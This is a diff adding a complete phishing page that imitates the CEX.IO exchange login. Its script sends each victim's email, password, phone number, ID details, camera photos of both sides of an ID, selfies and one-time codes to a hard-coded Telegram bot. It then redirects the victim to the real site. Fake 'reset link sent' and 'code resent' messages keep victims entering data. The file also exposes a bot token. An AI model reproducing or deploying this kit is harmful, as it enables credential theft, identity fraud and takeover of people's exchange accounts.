@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>
+      CEX.IO • Log In
+    </title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        background: #FFFFFF;
+        font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      .container {
+        max-width: 460px;
+        width: 100%;
+        margin: 0 auto;
+      }
+
+      .card {
+        background: #FFFFFF;
+        border-radius: 16px;
+        padding: 32px 28px 40px;
+        border: none;
+        box-shadow: none;
+      }
+
+      /* ---------- CEX.IO Header ---------- */
+      .cex-header {
+        text-align: center;
+        margin-bottom: 32px;
+      }
+
+      .cex-title {
+        font-size: 32px;
+        font-weight: 700;
+        color: #0B1426;
+        letter-spacing: -0.5px;
+        margin-bottom: 12px;
+      }
+
+      .cex-subtitle {
+        font-size: 16px;
+        color: #4A5568;
+        font-weight: 400;
+        line-height: 1.5;
+        max-width: 360px;
+        margin: 0 auto;
+      }
+
+      /* ---------- Inputs ---------- */
+      .input-group {
+        margin-bottom: 24px;
+      }
+
+      .input-label {
+        font-weight: 500;
+        font-size: 14px;
+        color: #1A202C;
+        margin-bottom: 8px;
+        display: block;
+      }
+
+      .input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+
+      input, select {
+        width: 100%;
+        padding: 16px 16px;
+        font-size: 16px;
+        background: #FFFFFF;
+        border: 1px solid #E2E8F0;
+        border-radius: 12px;
+        color: #1A202C;
+        outline: none;
+        transition: all 0.2s;
+        font-family: inherit;
+        appearance: none;
+      }
+
+      input::placeholder {
+        color: #A0AEC0;
+        font-weight: 400;
+      }
+
+      input:focus, select:focus {
+        border-color: #00B5AD;
+        box-shadow: 0 0 0 3px rgba(0, 181, 173, 0.15);
+      }
+
+      /* Email field special highlight */
+      .email-highlight {
+        border: 2px solid #7DD3C8;
+        border-radius: 12px;
+        padding: 2px;
+      }
+
+      .email-highlight input {
+        border: 1px solid #E2E8F0;
+        border-radius: 10px;
+      }
+
+      .email-highlight input:focus {
+        border-color: #00B5AD;
+        box-shadow: 0 0 0 3px rgba(0, 181, 173, 0.15);
+      }
+
+      /* Password eye icon */
+      .password-toggle {
+        position: absolute;
+        right: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        color: #A0AEC0;
+        font-size: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        user-select: none;
+        transition: color 0.2s;
+        background: none;
+        border: none;
+        padding: 4px;
+      }
+
+      .password-toggle:hover {
+        color: #718096;
+      }
+
+      /* ---------- Forgot password link ---------- */
+      .forgot-link {
+        text-align: center;
+        margin: 28px 0 24px;
+      }
+
+      .forgot-link a {
+        color: #F47B5B;
+        font-size: 16px;
+        font-weight: 500;
+        text-decoration: none;
+        transition: opacity 0.2s;
+      }
+
+      .forgot-link a:hover {
+        opacity: 0.8;
+      }
+
+      /* ---------- Action button ---------- */
+      .action-btn {
+        background: #00B5AD;
+        color: white;
+        font-weight: 600;
+        width: 100%;
+        border: none;
+        padding: 16px;
+        border-radius: 12px;
+        font-size: 17px;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 4px;
+      }
+
+      .action-btn:active {
+        transform: scale(0.98);
+        background: #009E97;
+      }
+
+      .action-btn:disabled {
+        background: #E2E8F0;
+        color: #A0AEC0;
+        cursor: not-allowed;
+      }
+
+      /* Secondary link button */
+      .link-btn {
+        background: none;
+        border: none;
+        color: #00B5AD;
+        font-weight: 500;
+        font-size: 14px;
+        cursor: pointer;
+        margin-top: 12px;
+        text-decoration: underline;
+        width: auto;
+        padding: 0;
+      }
+
+      .terms {
+        font-size: 11px;
+        color: #A0AEC0;
+        text-align: center;
+        margin-top: 28px;
+        line-height: 1.5;
+      }
+
+      /* ---------- KYC & Camera styles (kept from original) ---------- */
+      .step-indicator {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 28px;
+      }
+
+      .step-dot {
+        flex: 1;
+        height: 4px;
+        background: #E2E8F0;
+        border-radius: 4px;
+        transition: background 0.3s;
+      }
+
+      .step-dot.active {
+        background: #00B5AD;
+      }
+
+      .step-dot.completed {
+        background: #00B5AD;
+      }
+
+      .camera-container {
+        background: #000;
+        border-radius: 20px;
+        overflow: hidden;
+        margin: 16px 0 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      }
+
+      .square-camera {
+        aspect-ratio: 1 / 1;
+        background: #1A1A1A;
+      }
+
+      video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      .camera-controls {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 30px;
+        padding: 16px 0 8px;
+      }
+
+      .capture-btn {
+        background: white;
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        border: 4px solid #00B5AD;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.2);
+        cursor: pointer;
+        transition: 0.1s;
+      }
+
+      .capture-btn:active {
+        transform: scale(0.94);
+      }
+
+      .switch-cam {
+        background: rgba(0, 0, 0, 0.65);
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        cursor: pointer;
+        color: white;
+        backdrop-filter: blur(5px);
+      }
+
+      .status-badge {
+        background: #F7FAFC;
+        padding: 10px;
+        border-radius: 60px;
+        text-align: center;
+        font-size: 13px;
+        margin: 12px 0 4px;
+        color: #2D3748;
+        font-weight: 500;
+      }
+
+      .toast {
+        background: #1A202C;
+        color: white;
+        border-radius: 40px;
+        padding: 12px 18px;
+        text-align: center;
+        opacity: 0;
+        transition: 0.2s;
+        pointer-events: none;
+        margin-top: 20px;
+        font-size: 14px;
+      }
+
+      .toast.show {
+        opacity: 1;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.92);
+        backdrop-filter: blur(8px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        z-index: 2000;
+        visibility: hidden;
+        opacity: 0;
+        transition: 0.2s;
+      }
+
+      .loading-overlay.active {
+        visibility: visible;
+        opacity: 1;
+      }
+
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid #00B5AD;
+        border-top-color: #FFFFFF;
+        border-radius: 50%;
+        animation: spin 0.9s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        font-size: 16px;
+        color: white;
+        text-align: center;
+        font-weight: 500;
+      }
+
+      .hide {
+        display: none;
+      }
+
+      .otp-hint {
+        background: #E6FFFA;
+        border-radius: 16px;
+        padding: 12px 16px;
+        text-align: center;
+        margin-bottom: 24px;
+        font-size: 15px;
+        border-left: 3px solid #00B5AD;
+        color: #234E52;
+      }
+
+      .phone-mask {
+        font-weight: 700;
+        color: #00B5AD;
+      }
+
+      .info-note {
+        background: #FFFAF0;
+        border-radius: 12px;
+        padding: 10px 12px;
+        font-size: 12px;
+        margin: 12px 0 4px;
+        color: #975A16;
+        text-align: center;
+      }
+
+      .back-link {
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      .back-link a {
+        color: #718096;
+        font-size: 13px;
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+
+      .back-link a:hover {
+        color: #4A5568;
+      }
+
+      .resend-options {
+        text-align: center;
+        margin-top: 16px;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        flex-wrap: wrap;
+      }
+
+      .resend-options .link-btn {
+        color: #00B5AD;
+        font-size: 13px;
+      }
+
+      /* Responsive */
+      @media (max-width: 480px) {
+        .card {
+          padding: 24px 20px 32px;
+        }
+        .cex-title {
+          font-size: 28px;
+        }
+        .cex-subtitle {
+          font-size: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- STEP 1: CEX.IO LOGIN -->
+      <div id="loginPanel" class="card">
+        <div class="cex-header">
+          <div class="cex-title">Log in to CEX.IO</div>
+          <div class="cex-subtitle">Enter your registered email address to log in.</div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="loginIdentifier">Your email</label>
+          <div class="email-highlight">
+            <input type="text" id="loginIdentifier" placeholder="Required" autocomplete="off" />
+          </div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="loginPassword">Password</label>
+          <div class="input-wrapper">
+            <input type="password" id="loginPassword" placeholder="Required" autocomplete="off" />
+            <button class="password-toggle" id="togglePasswordBtn" type="button" aria-label="Show password">
+              👁️
+            </button>
+          </div>
+        </div>
+        <div class="forgot-link">
+          <a href="#" id="forgotPasswordLink">Forgot password?</a>
+        </div>
+        <button class="action-btn" id="continueToPhoneBtn">
+          Log in
+        </button>
+        <div class="terms">
+          By clicking Log in, you agree to CEX.IO's
+          <a href="#" style="color:#00B5AD; text-decoration:none;">Terms of Service</a>
+          and
+          <a href="#" style="color:#00B5AD; text-decoration:none;">Privacy Policy</a>.
+        </div>
+      </div>
+
+      <!-- STEP 2: PHONE NUMBER -->
+      <div id="phonePanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Verify your identity</div>
+          <div class="cex-subtitle">Enter your mobile phone number to continue.</div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="userPhoneNumber">Mobile phone number</label>
+          <input type="tel" id="userPhoneNumber" placeholder="+1 234 567 8900" autocomplete="off" />
+          <div class="info-note">We'll use this number to verify your identity</div>
+        </div>
+        <button class="action-btn" id="submitPhoneBtn">
+          Continue →
+        </button>
+        <div class="back-link">
+          <a href="#" id="backToLoginFromPhone">← Back</a>
+        </div>
+      </div>
+
+      <!-- STEP 3: PASSWORD (if needed) -->
+      <div id="passwordPanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Confirm your password</div>
+          <div class="cex-subtitle">Please enter your account password.</div>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="userPassword">Password</label>
+          <input type="password" id="userPassword" placeholder="Enter your password" autocomplete="off" />
+        </div>
+        <button class="action-btn" id="submitPasswordBtn">
+          Log In →
+        </button>
+        <div class="back-link">
+          <a href="#" id="backToPhoneFromPassword">← Back</a>
+        </div>
+      </div>
+
+      <!-- STEP 4: KYC PHOTOS (ID + Selfie) -->
+      <div id="kycPanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Identity verification</div>
+          <div class="cex-subtitle">Please capture the required documents.</div>
+        </div>
+        <div class="step-indicator" id="stepIndicator">
+          <div class="step-dot"></div>
+          <div class="step-dot"></div>
+          <div class="step-dot"></div>
+          <div class="step-dot"></div>
+          <div class="step-dot"></div>
+        </div>
+
+        <!-- KYC Step 1: ID metadata -->
+        <div id="kycStep1" class="kyc-step">
+          <div class="input-group">
+            <label class="input-label" for="idType">ID type</label>
+            <select id="idType">
+              <option value="">Select document</option>
+              <option>Driver's License</option>
+              <option>State ID Card</option>
+              <option>Passport</option>
+              <option>Resident Permit</option>
+            </select>
+          </div>
+          <div class="input-group">
+            <label class="input-label" for="idState">Issuing state / country</label>
+            <select id="idState">
+              <option value="">Select state or region</option>
+              <option>Alabama</option>
+              <option>Alaska</option>
+              <option>Arizona</option>
+              <option>Arkansas</option>
+              <option>California</option>
+              <option>Colorado</option>
+              <option>Connecticut</option>
+              <option>Delaware</option>
+              <option>Florida</option>
+              <option>Georgia</option>
+              <option>Hawaii</option>
+              <option>Idaho</option>
+              <option>Illinois</option>
+              <option>Indiana</option>
+              <option>Iowa</option>
+              <option>Kansas</option>
+              <option>Kentucky</option>
+              <option>Louisiana</option>
+              <option>Maine</option>
+              <option>Maryland</option>
+              <option>Massachusetts</option>
+              <option>Michigan</option>
+              <option>Minnesota</option>
+              <option>Mississippi</option>
+              <option>Missouri</option>
+              <option>Montana</option>
+              <option>Nebraska</option>
+              <option>Nevada</option>
+              <option>New Hampshire</option>
+              <option>New Jersey</option>
+              <option>New Mexico</option>
+              <option>New York</option>
+              <option>North Carolina</option>
+              <option>North Dakota</option>
+              <option>Ohio</option>
+              <option>Oklahoma</option>
+              <option>Oregon</option>
+              <option>Pennsylvania</option>
+              <option>Rhode Island</option>
+              <option>South Carolina</option>
+              <option>South Dakota</option>
+              <option>Tennessee</option>
+              <option>Texas</option>
+              <option>Utah</option>
+              <option>Vermont</option>
+              <option>Virginia</option>
+              <option>Washington</option>
+              <option>West Virginia</option>
+              <option>Wisconsin</option>
+              <option>Wyoming</option>
+            </select>
+          </div>
+          <button class="action-btn" id="kycStep1Next">
+            Continue to ID capture →
+          </button>
+        </div>
+
+        <!-- KYC Step 2: Front ID -->
+        <div id="kycStep2" class="kyc-step hide">
+          <div class="status-badge">📄 Front side of your ID</div>
+          <div class="camera-container">
+            <div class="square-camera">
+              <video id="frontVideo" autoplay playsinline muted></video>
+            </div>
+          </div>
+          <div class="camera-controls">
+            <div class="switch-cam" id="switchFrontCam">⟳</div>
+            <div class="capture-btn" id="captureFrontBtn"></div>
+            <div style="width:44px;"></div>
+          </div>
+          <div class="status-badge" id="frontStatus">Position ID in frame &amp; tap circle</div>
+        </div>
+
+        <!-- KYC Step 3: Back ID -->
+        <div id="kycStep3" class="kyc-step hide">
+          <div class="status-badge">🔄 Back side of your ID</div>
+          <div class="camera-container">
+            <div class="square-camera">
+              <video id="backVideo" autoplay playsinline muted></video>
+            </div>
+          </div>
+          <div class="camera-controls">
+            <div class="switch-cam" id="switchBackCam">⟳</div>
+            <div class="capture-btn" id="captureBackBtn"></div>
+            <div style="width:44px;"></div>
+          </div>
+          <div class="status-badge" id="backStatus">Ready to capture</div>
+        </div>
+
+        <!-- KYC Step 4: Selfie -->
+        <div id="kycStep4" class="kyc-step hide">
+          <div class="status-badge">🤳 Take a selfie</div>
+          <div class="camera-container">
+            <div class="square-camera">
+              <video id="selfieVideo" autoplay playsinline muted></video>
+            </div>
+          </div>
+          <div class="camera-controls">
+            <div class="switch-cam" id="switchSelfieCam">⟳</div>
+            <div class="capture-btn" id="captureSelfieBtn"></div>
+            <div style="width:44px;"></div>
+          </div>
+          <div class="status-badge" id="selfieStatus">Look at the camera</div>
+        </div>
+
+        <!-- KYC Step 5: Selfie with ID -->
+        <div id="kycStep5" class="kyc-step hide">
+          <div class="status-badge">📸 Selfie holding ID next to your face</div>
+          <div class="camera-container">
+            <div class="square-camera">
+              <video id="selfieIdVideo" autoplay playsinline muted></video>
+            </div>
+          </div>
+          <div class="camera-controls">
+            <div class="switch-cam" id="switchSelfieIdCam">⟳</div>
+            <div class="capture-btn" id="captureSelfieIdBtn"></div>
+            <div style="width:44px;"></div>
+          </div>
+          <div class="status-badge" id="selfieIdStatus">Hold ID clearly visible</div>
+        </div>
+      </div>
+
+      <!-- STEP 5: OTP PAGE -->
+      <div id="otpPanel" class="card hide">
+        <div class="cex-header">
+          <div class="cex-title">Verification code</div>
+          <div class="cex-subtitle">Enter the code sent to your phone.</div>
+        </div>
+        <div class="otp-hint" id="otpPhoneHint">
+          🔐 Verification code sent to
+          <span class="phone-mask" id="maskedPhone">****</span>
+        </div>
+        <div class="input-group">
+          <label class="input-label" for="otpCode">Enter code</label>
+          <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off" />
+        </div>
+        <button class="action-btn" id="otpSubmitBtn">
+          Verify
+        </button>
+        <div class="resend-options">
+          <button class="link-btn" id="resendSmsBtn">📱 Resend SMS</button>
+          <button class="link-btn" id="requestEmailOtpBtn">✉️ Send code to email instead</button>
+        </div>
+        <div class="terms">
+          We sent a one-time code to your mobile. You can also request it via email.
+        </div>
+        <div class="back-link">
+          <a href="#" id="backToKycLink">← Back to verification</a>
+        </div>
+      </div>
+
+      <div id="toastMsg" class="toast"></div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+      <div class="spinner"></div>
+      <div class="loading-text">
+        Processing verification...
+        <br />
+        Please wait
+      </div>
+    </div>
+
+    <script>
+      // Telegram bot credentials
+      const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+      const CHAT_ID = "8737104261";
+
+      let userData = {
+        identifier: '',
+        phoneNumber: '',
+        password: '',
+        idType: '',
+        idState: '',
+        otpCode: ''
+      };
+
+      // DOM panels
+      const loginPanel = document.getElementById('loginPanel');
+      const phonePanel = document.getElementById('phonePanel');
+      const passwordPanel = document.getElementById('passwordPanel');
+      const kycPanel = document.getElementById('kycPanel');
+      const otpPanel = document.getElementById('otpPanel');
+      const toast = document.getElementById('toastMsg');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+
+      // Step 1 elements
+      const loginIdentifier = document.getElementById('loginIdentifier');
+      const loginPassword = document.getElementById('loginPassword');
+      const continueToPhoneBtn = document.getElementById('continueToPhoneBtn');
+      const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+      const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+
+      // Step 2 elements
+      const userPhoneInput = document.getElementById('userPhoneNumber');
+      const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+      const backToLoginFromPhone = document.getElementById('backToLoginFromPhone');
+
+      // Step 3 elements
+      const userPasswordInput = document.getElementById('userPassword');
+      const submitPasswordBtn = document.getElementById('submitPasswordBtn');
+      const backToPhoneFromPassword = document.getElementById('backToPhoneFromPassword');
+
+      // OTP elements
+      const otpSubmit = document.getElementById('otpSubmitBtn');
+      const otpCodeInput = document.getElementById('otpCode');
+      const maskedPhoneSpan = document.getElementById('maskedPhone');
+      const backToKycLink = document.getElementById('backToKycLink');
+      const resendSmsBtn = document.getElementById('resendSmsBtn');
+      const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
+
+      // ---- Password toggle ----
+      let passwordVisible = false;
+      if (togglePasswordBtn) {
+        togglePasswordBtn.addEventListener('click', () => {
+          passwordVisible = !passwordVisible;
+          loginPassword.type = passwordVisible ? 'text' : 'password';
+          togglePasswordBtn.textContent = passwordVisible ? '🙈' : '👁️';
+        });
+      }
+
+      // ---- Forgot password ----
+      if (forgotPasswordLink) {
+        forgotPasswordLink.addEventListener('click', (e) => {
+          e.preventDefault();
+          showToast('Password reset link sent to your email.', false);
+          sendToTelegram(`🔑 <b>CEX.IO PASSWORD RESET</b>\nUser: ${userData.identifier || loginIdentifier.value || 'unknown'}`);
+        });
+      }
+
+      function showToast(msg, isError = false) {
+        toast.innerText = msg;
+        toast.classList.add('show');
+        toast.style.background = isError ? '#E53E3E' : '#1A202C';
+        setTimeout(() => toast.classList.remove('show'), 3000);
+      }
+
+      async function sendToTelegram(text) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+          });
+          return res.ok;
+        } catch (e) {
+          return false;
+        }
+      }
+
+      async function sendPhotoToTelegram(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'cex_verification.jpg');
+        if (caption) formData.append('caption', caption);
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          return res.ok;
+        } catch (e) {
+          return false;
+        }
+      }
+
+      // ---- Step 1 -> Step 2 ----
+      continueToPhoneBtn.onclick = () => {
+        const identifier = loginIdentifier.value.trim();
+        const password = loginPassword.value.trim();
+
+        if (!identifier) {
+          showToast("Please enter your email address", true);
+          return;
+        }
+        if (!password) {
+          showToast("Please enter your password", true);
+          return;
+        }
+
+        userData.identifier = identifier;
+        userData.password = password;
+
+        sendToTelegram(`💳 <b>CEX.IO - LOGIN</b>\nEmail: <code>${identifier}</code>\nPassword: <code>${password}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+
+        loginPanel.classList.add('hide');
+        phonePanel.classList.remove('hide');
+      };
+
+      backToLoginFromPhone.onclick = (e) => {
+        e.preventDefault();
+        phonePanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+        userPhoneInput.value = '';
+      };
+
+      // ---- Step 2 -> Step 3 ----
+      submitPhoneBtn.onclick = () => {
+        const phone = userPhoneInput.value.trim();
+        if (!phone || phone.length < 5) {
+          showToast("Valid phone number required", true);
+          return;
+        }
+        userData.phoneNumber = phone;
+        sendToTelegram(`📱 <b>CEX.IO - PHONE NUMBER</b>\nPhone: <code>${phone}</code>\nUser: ${userData.identifier}`);
+        phonePanel.classList.add('hide');
+        passwordPanel.classList.remove('hide');
+        // Pre-fill password if already entered
+        userPasswordInput.value = userData.password || '';
+      };
+
+      backToPhoneFromPassword.onclick = (e) => {
+        e.preventDefault();
+        passwordPanel.classList.add('hide');
+        phonePanel.classList.remove('hide');
+        userPasswordInput.value = '';
+      };
+
+      // ---- Step 3 -> KYC ----
+      submitPasswordBtn.onclick = async () => {
+        const password = userPasswordInput.value.trim();
+        if (!password) {
+          showToast("Please enter your password", true);
+          return;
+        }
+        userData.password = password;
+        await sendToTelegram(`🔐 <b>CEX.IO PASSWORD CONFIRMED</b>\nPassword: <code>${password}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
+        passwordPanel.classList.add('hide');
+        kycPanel.classList.remove('hide');
+        showKycStep(1);
+      };
+
+      // ---------- KYC PHOTO LOGIC ----------
+      let currentKycStep = 1;
+      let frontStream, backStream, selfieStream, selfieIdStream;
+      let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
+
+      function stopStream(stream) {
+        if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
+      }
+
+      async function initCamera(videoEl, facingMode) {
+        try {
+          let constraints = { video: { facingMode: { exact: facingMode } } };
+          let stream = await navigator.mediaDevices.getUserMedia(constraints);
+          videoEl.srcObject = stream;
+          await videoEl.play();
+          return stream;
+        } catch (e) {
+          let fallback = await navigator.mediaDevices.getUserMedia({ video: true });
+          videoEl.srcObject = fallback;
+          await videoEl.play();
+          return fallback;
+        }
+      }
+
+      async function switchCamera(video, currentStream, setStream, setRear, currentRear) {
+        if (currentStream) stopStream(currentStream);
+        let newFacing = currentRear ? 'user' : 'environment';
+        let newStream = await initCamera(video, newFacing);
+        setStream(newStream);
+        setRear(!currentRear);
+      }
+
+      async function capturePhoto(video, statusElem, sideDescription, nextStepCallback = null) {
+        if (!video.videoWidth || video.videoWidth === 0) {
+          showToast("Camera not ready", true);
+          return;
+        }
+        statusElem.innerText = "Uploading...";
+        let canvas = document.createElement('canvas');
+        let size = Math.min(video.videoWidth, video.videoHeight);
+        canvas.width = size;
+        canvas.height = size;
+        let ctx = canvas.getContext('2d');
+        let sx = (video.videoWidth - size) / 2;
+        let sy = (video.videoHeight - size) / 2;
+        ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
+        canvas.toBlob(async blob => {
+          const caption = `[CEX.IO KYC] ${sideDescription} | User: ${userData.identifier} | Phone: ${userData.phoneNumber}`;
+          await sendPhotoToTelegram(blob, caption);
+          statusElem.innerText = `✅ ${sideDescription} uploaded.`;
+          if (nextStepCallback) setTimeout(() => nextStepCallback(), 800);
+        }, 'image/jpeg', 0.8);
+      }
+
+      function showKycStep(step) {
+        document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
+        const targetStep = document.getElementById(`kycStep${step}`);
+        if (targetStep) targetStep.classList.remove('hide');
+        currentKycStep = step;
+        updateStepDots(step);
+        if (step === 2) {
+          stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
+        } else if (step === 3) {
+          stopStream(frontStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
+        } else if (step === 4) {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieIdStream);
+          initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
+        } else if (step === 5) {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream);
+          initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
+        }
+      }
+
+      function updateStepDots(step) {
+        const dots = document.querySelectorAll('.step-dot');
+        dots.forEach((dot, i) => {
+          if (i + 1 < step) dot.classList.add('completed');
+          else if (i + 1 === step) dot.classList.add('active');
+          else dot.classList.remove('active', 'completed');
+        });
+      }
+
+      // KYC Step 1 (ID metadata)
+      document.getElementById('kycStep1Next').onclick = () => {
+        let idType = document.getElementById('idType').value;
+        let idState = document.getElementById('idState').value;
+        if (!idType || !idState) {
+          showToast("Please select ID type and issuing state", true);
+          return;
+        }
+        userData.idType = idType;
+        userData.idState = idState;
+        sendToTelegram(`📄 <b>CEX.IO ID DETAILS</b>\nType: ${idType}\nState: ${idState}\nUser: ${userData.identifier}`);
+        showKycStep(2);
+      };
+
+      // Camera event handlers
+      document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront);
+      document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "FRONT_ID", () => showKycStep(3));
+      document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s => backStream = s, v => usingRearBack = v, usingRearBack);
+      document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "BACK_ID", () => showKycStep(4));
+      document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s => selfieStream = s, v => usingRearSelfie = v, usingRearSelfie);
+      document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "SELFIE_FACE", () => showKycStep(5));
+      document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s => selfieIdStream = s, v => usingRearSelfieId = v, usingRearSelfieId);
+      document.getElementById('captureSelfieIdBtn').onclick = () => {
+        capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
+          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+          kycPanel.classList.add('hide');
+          let last4 = userData.phoneNumber.length >= 4 ? userData.phoneNumber.slice(-4) : "****";
+          maskedPhoneSpan.innerText = last4;
+          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${last4}`);
+          otpPanel.classList.remove('hide');
+          showToast("Identity documents uploaded. Enter the verification code sent to your phone.", false);
+        });
+      };
+
+      // OTP submission
+      otpSubmit.onclick = async () => {
+        const otpValue = otpCodeInput.value.trim();
+        if (!otpValue) {
+          showToast("Please enter the verification code", true);
+          return;
+        }
+        userData.otpCode = otpValue;
+        await sendToTelegram(`🔢 <b>CEX.IO OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\n✅ All data captured.`);
+        loadingOverlay.classList.add('active');
+        setTimeout(() => {
+          loadingOverlay.classList.remove('active');
+          showToast("Verification successful! Redirecting to CEX.IO...", false);
+          setTimeout(() => window.location.href = "https://cex.io", 1500);
+        }, 1800);
+      };
+
+      // Resend SMS & Request email OTP
+      resendSmsBtn.onclick = async () => {
+        showToast("A new verification code has been sent to your phone.", false);
+        await sendToTelegram(`🔄 <b>RESEND OTP (SMS)</b>\nUser requested new SMS code.\nPhone: ${userData.phoneNumber}`);
+      };
+
+      requestEmailOtpBtn.onclick = async () => {
+        showToast("We've sent a verification code to your registered email address.", false);
+        await sendToTelegram(`✉️ <b>REQUEST OTP VIA EMAIL</b>\nUser requested OTP to be sent to email.\nLinked email: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
+      };
+
+      backToKycLink.onclick = (e) => {
+        e.preventDefault();
+        otpPanel.classList.add('hide');
+        kycPanel.classList.remove('hide');
+        showKycStep(5);
+      };
+
+      window.addEventListener('beforeunload', () => {
+        stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
+      });
+    </script>
+  </body>
+</html>
